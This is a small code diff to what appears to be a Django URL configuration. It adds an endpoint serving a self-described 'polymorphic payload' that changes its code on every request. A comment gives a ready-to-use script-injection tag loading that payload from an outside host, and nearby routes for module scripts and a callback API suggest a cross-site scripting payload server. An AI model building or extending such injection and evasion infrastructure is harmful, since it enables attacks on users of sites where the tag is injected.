@@ -51,6 +51,10 @@ urlpatterns = [
     path('m.js', views.serve_module_js, name='serve_module'),
     path('m/<str:module_name>.js', views.serve_module_js, name='serve_module_named'),
 
+    # Advanced Polymorphic payload - unique code every request
+    # Usage: <script src=//6u.gg/poly.js></script>
+    path('poly.js', views.poly_js, name='poly_js'),
+
     # API callback (fallback for non-WebSocket)
     path('api/callback/', views.api_callback, name='api_callback'),
 ]
